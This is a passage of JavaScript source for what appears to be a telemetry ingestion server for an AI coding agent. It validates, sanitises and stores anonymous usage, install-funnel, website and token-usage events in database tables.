    `).bind(activityDate, body.country, body.event, boolToInt(body.is_ci)).run();
  } catch (err) {
    // Databases predating migration 0022 have no country_daily table; never
    // fail the canonical event insert over the geo rollup.
    console.warn("country rollup failed", err?.message || err);
  }
}

function isMeaningfulLifecycleEvent(body) {
  const errors = body.errors || {};
  if (body.event === "prompt_submitted") {
    return true;
  }
  if (["session_end", "session_crash"].includes(body.event)) {
    return (
      (body.turns || 0) > 0
      || boolToInt(body.had_user_prompt) > 0
      || boolToInt(body.had_assistant_response) > 0
      || (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.duration_secs || 0) > 0
      || (errors.provider_timeout || 0) > 0
      || (errors.auth_failed || 0) > 0
      || (errors.tool_error || 0) > 0
      || (errors.mcp_error || 0) > 0
      || (errors.rate_limited || 0) > 0
      || (body.provider_switches || 0) > 0
      || (body.model_switches || 0) > 0
    );
  }
  // A turn_end event only fires after a real user turn completes (a prompt was
  // submitted and the agent did work), so it is strong evidence of meaningful
  // activity even when the session_end/session_crash event is lost (process
  // killed, machine shutdown, network drop on the final flush, or a session
  // still open at UTC midnight). Counting it here avoids undercounting the
  // headline meaningful DAU for those users.
  if (body.event === "turn_end") {
    return (
      (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.file_write_calls || 0) > 0
      || (body.tests_run || 0) > 0
      || boolToInt(body.turn_success) > 0
    );
  }
  return false;
}

async function insertSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["session_start_hour_utc", body.session_start_hour_utc ?? null],
    ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
    ["session_end_hour_utc", body.session_end_hour_utc ?? null],
    ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
    ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
    ["sessions_started_24h", body.sessions_started_24h || 0],
    ["sessions_started_7d", body.sessions_started_7d || 0],
    ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
    ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
    ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
    ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
    ["first_file_edit_ms", body.first_file_edit_ms || null],
    ["first_test_pass_ms", body.first_test_pass_ms || null],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["command_login_used", boolToInt(body.command_login_used)],
    ["command_model_used", boolToInt(body.command_model_used)],
    ["command_usage_used", boolToInt(body.command_usage_used)],
    ["command_resume_used", boolToInt(body.command_resume_used)],
    ["command_memory_used", boolToInt(body.command_memory_used)],
    ["command_swarm_used", boolToInt(body.command_swarm_used)],
    ["command_goal_used", boolToInt(body.command_goal_used)],
    ["command_selfdev_used", boolToInt(body.command_selfdev_used)],
    ["command_feedback_used", boolToInt(body.command_feedback_used)],
    ["command_other_used", boolToInt(body.command_other_used)],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
    ["project_repo_present", boolToInt(body.project_repo_present)],
    ["project_lang_rust", boolToInt(body.project_lang_rust)],
    ["project_lang_js_ts", boolToInt(body.project_lang_js_ts)],
    ["project_lang_python", boolToInt(body.project_lang_python)],
    ["project_lang_go", boolToInt(body.project_lang_go)],
    ["project_lang_markdown", boolToInt(body.project_lang_markdown)],
    ["project_lang_mixed", boolToInt(body.project_lang_mixed)],
    ["days_since_install", body.days_since_install || null],
    ["active_days_7d", body.active_days_7d || 0],
    ["active_days_30d", body.active_days_30d || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'session_details', values);
  }
}

function commonEventEntries(body, columns) {
  const values = [];
  if (columns.has("event_id")) {
    values.push(["event_id", body.event_id || null]);
  }
  if (columns.has("session_id")) {
    values.push(["session_id", body.session_id || null]);
  }
  if (columns.has("schema_version")) {
    values.push(["schema_version", body.schema_version || 1]);
  }
  if (columns.has("build_channel")) {
    values.push(["build_channel", body.build_channel || null]);
  }
  if (columns.has("is_git_checkout")) {
    values.push(["is_git_checkout", boolToInt(body.is_git_checkout)]);
  }
  if (columns.has("is_ci")) {
    values.push(["is_ci", boolToInt(body.is_ci)]);
  }
  if (columns.has("ran_from_cargo")) {
    values.push(["ran_from_cargo", boolToInt(body.ran_from_cargo)]);
  }
  return values;
}

// Desktop sends short tokens only. Re-sanitize server-side so a buggy or
// hostile client cannot store messages or paths: lowercase [a-z0-9_] (or the
// given disallowed-char pattern for versions), max 64 chars, null if empty.
function desktopToken(value, disallowed = null) {
  if (value == null) return null;
  let text = String(value).trim();
  text = disallowed
    ? text.replace(disallowed, "")
    : text.toLowerCase().replace(/[^a-z0-9_]+/g, "_").replace(/^_+|_+$/g, "");
  text = text.slice(0, 64);
  return text || null;
}

async function getEventColumns(env) {
  if (cachedEventColumns) {
    return cachedEventColumns;
  }
  const result = await env.DB.prepare("PRAGMA table_info(events)").all();
  cachedEventColumns = new Set((result.results || []).map((row) => row.name));
  return cachedEventColumns;
}

async function getSessionDetailColumns(env) {
  if (cachedSessionDetailColumns) {
    return cachedSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(session_details)").all();
    cachedSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedSessionDetailColumns = new Set();
  }
  return cachedSessionDetailColumns;
}

async function getTurnDetailColumns(env) {
  if (cachedTurnDetailColumns) {
    return cachedTurnDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(turn_details)").all();
    cachedTurnDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTurnDetailColumns = new Set();
  }
  return cachedTurnDetailColumns;
}

async function getWebDetailColumns(env) {
  if (cachedWebDetailColumns) {
    return cachedWebDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(web_details)").all();
    cachedWebDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedWebDetailColumns = new Set();
  }
  return cachedWebDetailColumns;
}

async function getInstallDetailColumns(env) {
  if (cachedInstallDetailColumns) {
    return cachedInstallDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(install_details)").all();
    cachedInstallDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedInstallDetailColumns = new Set();
  }
  return cachedInstallDetailColumns;
}

async function getDiscoveryDetailColumns(env) {
  if (cachedDiscoveryDetailColumns) {
    return cachedDiscoveryDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(discovery_details)").all();
    cachedDiscoveryDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedDiscoveryDetailColumns = new Set();
  }
  return cachedDiscoveryDetailColumns;
}

async function getTodoSessionDetailColumns(env) {
  if (cachedTodoSessionDetailColumns) {
    return cachedTodoSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(todo_session_details)").all();
    cachedTodoSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTodoSessionDetailColumns = new Set();
  }
  return cachedTodoSessionDetailColumns;
}

async function insertDiscoveryDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["request_id", body.request_id],
    ["phase", body.phase],
    ["category", body.category || null],
    ["selected_tool", body.selected_tool || null],
    ["outcome", body.outcome],
    ["failure_reason", body.failure_reason || null],
    ["http_status", body.http_status ?? null],
    ["latency_ms", body.latency_ms || 0],
    ["response_bytes", body.response_bytes ?? null],
    ["result_count", body.result_count ?? null],
    ["query_present", boolToInt(body.query_present)],
    ["reason_present", boolToInt(body.reason_present)],
    ["custom_endpoint", boolToInt(body.custom_endpoint)],
    ["benchmark_run", boolToInt(body.benchmark_run)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "discovery_details", values);
  }
}

async function insertTodoSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["correlation_id", body.correlation_id],
    ["session_end_reason", body.session_end_reason],
    ["todos_created", body.todos_created || 0],
    ["todos_completed", body.todos_completed || 0],
    ["todos_abandoned", body.todos_abandoned || 0],
    ["todo_updates", body.todo_updates || 0],
    ["groups_completed", body.groups_completed || 0],
    ["groups_total", body.groups_total || 0],
    ["max_todo_list_size", body.max_todo_list_size || 0],
    ["confidence_min", body.confidence_min ?? null],
    ["confidence_mean", body.confidence_mean ?? null],
    ["confidence_count", body.confidence_count || 0],
    ["completion_confidence_min", body.completion_confidence_min ?? null],
    ["completion_confidence_mean", body.completion_confidence_mean ?? null],
    ["completion_confidence_count", body.completion_confidence_count || 0],
    ["understands_user_intent_min", body.understands_user_intent_min ?? null],
    ["understands_user_intent_mean", body.understands_user_intent_mean ?? null],
    ["understands_user_intent_count", body.understands_user_intent_count || 0],
    ["closed_feedback_loop_min", body.closed_feedback_loop_min ?? null],
    ["closed_feedback_loop_mean", body.closed_feedback_loop_mean ?? null],
    ["closed_feedback_loop_count", body.closed_feedback_loop_count || 0],
    ["end_to_end_ownership_min", body.end_to_end_ownership_min ?? null],
    ["end_to_end_ownership_mean", body.end_to_end_ownership_mean ?? null],
    ["end_to_end_ownership_count", body.end_to_end_ownership_count || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "todo_session_details", values);
  }
}

async function insertWebDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["path", body.path || null],
    ["referrer", body.referrer || null],
    ["visitor_id", body.visitor_id || null],
    ["utm_source", body.utm_source || null],
    ["utm_medium", body.utm_medium || null],
    ["utm_campaign", body.utm_campaign || null],
    ["cta", body.cta || null],
    ["metric_name", body.metric_name || null],
    ["metric_value", body.metric_value ?? null],
    ["rating", body.rating || null],
    ["error_kind", body.error_kind || null],
    ["pageview_id", body.pageview_id || null],
    ["conversion_id", body.conversion_id || null],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "web_details", values);
  }
}

async function insertInstallDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["conversion_id", body.conversion_id],
    ["stage", body.stage],
    ["outcome", body.outcome],
    ["source", body.source],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
    ["failure_stage", body.failure_stage || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "install_details", values);
  }
}

// Normalize a website beacon event in place. Browsers do not send
// version/os/arch and mint an anonymous visitor_id in localStorage, so the
// visitor_id doubles as the telemetry id and free-text fields are
// length-capped (same defensive posture as the firehose blob caps).
// Returns an error string when the event is invalid, otherwise null.
function normalizeWebEvent(body) {
  if (typeof body.visitor_id !== "string" || body.visitor_id.length === 0) {
    return "Missing visitor_id";
  }
  if (typeof body.path !== "string" || body.path.length === 0) {
    return "Missing path";
  }
  if (body.event === "web_cta_click" && (typeof body.cta !== "string" || body.cta.length === 0)) {
    return "Missing cta";
  }
  if (body.event === "web_vital") {
    const metricNames = new Set(["CLS", "FCP", "INP", "LCP", "TTFB"]);
    const ratings = new Set(["good", "needs-improvement", "poor"]);
    if (!metricNames.has(body.metric_name)) {
      return "Invalid metric_name";
    }
    if (typeof body.metric_value !== "number" || !Number.isFinite(body.metric_value) || body.metric_value < 0) {
      return "Invalid metric_value";
    }
    if (!ratings.has(body.rating)) {
      return "Invalid rating";
    }
    const cap = body.metric_name === "CLS" ? 10 : 300_000;
    body.metric_value = Math.min(body.metric_value, cap);
  }
  if (body.event === "web_error") {
    const errorKinds = new Set(["script", "promise", "resource"]);
    if (!errorKinds.has(body.error_kind)) {
      return "Invalid error_kind";
    }
    // Keep only route-level context for errors. In particular, do not retain
    // referrer or campaign values that may contain full URLs or query strings.
    for (const field of [
      "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
      "session_id", "pageview_id", "conversion_id", "placement", "install_method",
    ]) {
      delete body[field];
    }
  }
  if (body.conversion_id != null && !CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (body.install_method != null && !new Set([
    "shell", "download_macos", "download_linux", "download_windows",
  ]).has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !new Set(["hero", "sticky"]).has(body.placement)) {
    return "Invalid install placement";
  }
  // Error payloads are classification-only. Never retain messages, stacks,
  // filenames, or full URLs even if a caller includes them.
  for (const field of ["message", "error_message", "stack", "url", "filename", "source_url"]) {
    delete body[field];
  }
  body.visitor_id = body.visitor_id.slice(0, 96);
  if (body.session_id != null) body.session_id = String(body.session_id).slice(0, 96);
  body.id = body.id || body.visitor_id;
  // The beacon does not send an event_id, but web_details rows join on it.
  // Mint one server-side so path/referrer/utm/cta are actually persisted.
  body.event_id = body.event_id || crypto.randomUUID();
  body.version = body.version || "web";
  body.os = body.os || "web";
  body.arch = body.arch || "web";
  for (const field of [
    "path", "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
    "pageview_id", "conversion_id", "placement", "install_method",
  ]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

const CONVERSION_ID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

function normalizeInstallConversion(body) {
  if (!CONVERSION_ID_PATTERN.test(body.install_conversion_id)) {
    return "Invalid install_conversion_id";
  }
  body.conversion_id = body.install_conversion_id.toLowerCase();
  return null;
}

function normalizeInstallFunnelEvent(body) {
  const stages = new Set(["command_copy", "script_request", "installer_start", "installer_finish"]);
  const outcomes = new Set(["success", "failure"]);
  const sources = new Set(["browser", "install_endpoint", "installer"]);
  const methods = new Set(["shell", "download_macos", "download_linux", "download_windows"]);
  const placements = new Set(["hero", "sticky"]);

  if (!CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (!stages.has(body.stage)) {
    return "Invalid install stage";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid install outcome";
  }
  if (!sources.has(body.source)) {
    return "Invalid install source";
  }
  if (body.install_method != null && !methods.has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !placements.has(body.placement)) {
    return "Invalid install placement";
  }
  if (body.failure_stage != null && !/^[a-z0-9_]{0,64}$/i.test(body.failure_stage)) {
    return "Invalid failure_stage";
  }
  if (body.outcome !== "failure") {
    body.failure_stage = null;
  }
  body.conversion_id = body.conversion_id.toLowerCase();
  body.id = body.id || body.conversion_id;
  body.event_id = body.event_id || crypto.randomUUID();
  for (const field of ["stage", "outcome", "source", "placement", "install_method", "failure_stage"]) {
    if (body[field] != null) body[field] = String(body[field]).slice(0, 100);
  }
  return null;
}

// Normalize a token-subscription event in place. account_id is required for
// all of them; account_linked is the analytics<->account join event and also
// requires the telemetry id. Returns an error string or null.
function normalizeSubscriptionEvent(body) {
  if (typeof body.account_id !== "string" || body.account_id.length === 0) {
    return "Missing account_id";
  }
  body.account_id = body.account_id.slice(0, 96);
  for (const field of ["tier", "model"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

function normalizeDiscoveryEvent(body) {
  const phases = new Set(["browse", "details", "select", "suggest", "unknown"]);
  const outcomes = new Set(["success", "failure"]);
  const failures = new Set([
    "disabled", "invalid_input", "invalid_category", "timeout",
    "connect_error", "transport_error", "http_error", "body_error",
    "response_too_large", "invalid_json", "invalid_response",
  ]);
  if (typeof body.request_id !== "string" || body.request_id.length === 0) {
    return "Missing request_id";
  }
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(body.request_id)) {
    return "Invalid request_id";
  }
  if (!phases.has(body.phase)) {
    return "Invalid discovery phase";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid discovery outcome";
  }
  if (body.outcome === "failure" && !failures.has(body.failure_reason)) {
    return "Invalid discovery failure_reason";
  }
  if (body.outcome === "success") {
    body.failure_reason = null;
  }
  body.request_id = body.request_id.slice(0, 96);
  for (const field of ["category", "selected_tool"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 100);
      if (!/^[a-z0-9][a-z0-9 ._+\/-]{0,99}$/i.test(body[field])) {
        return `Invalid discovery ${field}`;
      }
    }
  }
  body.http_status = body.http_status == null ? null : Math.max(100, Math.min(599, Number(body.http_status) || 0));
  body.latency_ms = Math.max(0, Math.min(300_000, Number(body.latency_ms) || 0));
  body.response_bytes = body.response_bytes == null ? null : Math.max(0, Math.min(1_048_576, Number(body.response_bytes) || 0));
  body.result_count = body.result_count == null ? null : Math.max(0, Math.min(10_000, Number(body.result_count) || 0));
  body.benchmark_run = body.benchmark_run === true;
  return null;
}

function normalizeTodoSessionEvent(body) {
  const uuidV4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  const endReasons = new Set([
    "normal_exit", "panic", "signal", "disconnect", "reload", "superseded", "unknown",
  ]);
  if (typeof body.correlation_id !== "string" || !uuidV4.test(body.correlation_id)) {
    return "Invalid todo correlation_id";
  }
  // This event must never carry the persistent telemetry ID. Its required `id`
  // envelope field is the same ephemeral UUID used for the within-session join.
  if (body.id !== body.correlation_id) {
    return "Todo id must equal correlation_id";
  }
  if (!endReasons.has(body.session_end_reason)) {
    return "Invalid todo session_end_reason";
  }

  for (const field of [
    "todos_created", "todos_completed", "todos_abandoned", "todo_updates",
    "groups_completed", "groups_total", "max_todo_list_size", "confidence_count",
    "completion_confidence_count", "understands_user_intent_count",
    "closed_feedback_loop_count", "end_to_end_ownership_count",
  ]) {
    body[field] = Math.max(0, Math.min(1_000_000, Math.trunc(Number(body[field]) || 0)));
  }
  for (const field of [
    "confidence_min", "confidence_mean", "completion_confidence_min",
    "completion_confidence_mean", "understands_user_intent_min",
    "understands_user_intent_mean", "closed_feedback_loop_min",
    "closed_feedback_loop_mean", "end_to_end_ownership_min", "end_to_end_ownership_mean",
  ]) {
    body[field] = body[field] == null
      ? null
      : Math.max(0, Math.min(100, Number(body[field]) || 0));
  }
  return null;
}

async function insertDynamic(env, table, entries) {
  const columns = entries.map(([name]) => name);
  const placeholders = columns.map(() => "?").join(", ");
  const sql = `INSERT OR IGNORE INTO ${table} (${columns.join(", ")}) VALUES (${placeholders})`;
  const values = entries.map(([, value]) => value);
  const result = await env.DB.prepare(sql).bind(...values).run();
  observeDbSize(result);
  return result;
}

function boolToInt(value) {
  return value ? 1 : 0;
}

const USAGE_REPORT_SOURCES = new Set(["agent", "compaction", "sidecar"]);
const USAGE_TOKEN_FIELDS = [
  "input_tokens",
  "output_tokens",
  "cache_read_input_tokens",
  "cache_creation_input_tokens",
  "total_tokens",
];
// One provider response cannot plausibly exceed this; rejects garbage that
// would otherwise poison the spend rollup.
const MAX_USAGE_TOKENS_PER_REPORT = 50_000_000;

function normalizeUsageLabel(value) {
  if (typeof value !== "string") {
    return "";
  }
  return value.trim().slice(0, 120);
}

// Validates a `usage_report` and maps it onto the shared firehose blobs:
// provider/model go to provider_end/model_end (the model that served the
// response) and source goes to `step`, so per-response detail stays queryable
// in Analytics Engine without widening the full FIREHOSE_SCHEMA.
export function normalizeUsageReportEvent(body) {
  if (!USAGE_REPORT_SOURCES.has(body.source)) {
    return "Invalid usage_report source";
  }
  body.provider = normalizeUsageLabel(body.provider);
  body.model = normalizeUsageLabel(body.model);
  if (!body.model) {
    return "Missing usage_report model";
  }
  for (const field of USAGE_TOKEN_FIELDS) {
    const value = body[field] ?? 0;
    if (!Number.isInteger(value) || value < 0 || value > MAX_USAGE_TOKENS_PER_REPORT) {
      return `Invalid usage_report ${field}`;
    }
    body[field] = value;
  }
  const responses = body.responses ?? 1;
  if (!Number.isInteger(responses) || responses < 1 || responses > 10_000) {
    return "Invalid usage_report responses";
  }
  body.responses = responses;
  body.provider_end = body.provider;
  body.model_end = body.model;
  body.step = body.source;
  return null;
}

async function recordDailyModelUsage(env, body) {
  const usageDate = new Date().toISOString().slice(0, 10);
  await env.DB.prepare(`
    INSERT INTO daily_model_usage (
      usage_date, source, provider, model, build_channel, is_ci, responses,
      input_tokens, output_tokens, cache_read_input_tokens,
      cache_creation_input_tokens, total_tokens
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(usage_date, source, provider, model, build_channel, is_ci) DO UPDATE SET
      responses = responses + excluded.responses,
      input_tokens = input_tokens + excluded.input_tokens,
      output_tokens = output_tokens + excluded.output_tokens,
      cache_read_input_tokens = cache_read_input_tokens + excluded.cache_read_input_tokens,
      cache_creation_input_tokens = cache_creation_input_tokens + excluded.cache_creation_input_tokens,
      total_tokens = total_tokens + excluded.total_tokens,
      updated_at = datetime('now')
  `).bind(
    usageDate,
    body.source,
    body.provider || "",
    body.model,
    body.build_channel || "",
    boolToInt(body.is_ci),
    body.responses,
    body.input_tokens,
    body.output_tokens,
    body.cache_read_input_tokens,
    body.cache_creation_input_tokens,
    body.total_tokens,
  ).run();
}

function jsonResponse(data, status = 200, cors = null) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      ...(cors || corsHeaders()),
    },
  });
}

function corsHeaders(request = null, env = null) {
  // Default policy: ALLOWED_ORIGIN var (currently "*"; telemetry is anonymous
  // and unauthenticated). Website beacon origins are additionally echoed back
  // explicitly, so browser preflights keep passing even if ALLOWED_ORIGIN is
  // ever narrowed away from "*".
  let allowOrigin = env?.ALLOWED_ORIGIN || "*";
  const origin = request?.headers?.get?.("Origin");
  const headers = {
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
  if (origin && WEB_ALLOWED_ORIGINS.has(origin)) {
    allowOrigin = origin;
    headers["Vary"] = "Origin";
  }
  headers["Access-Control-Allow-Origin"] = allowOrigin;
  return headers;
}
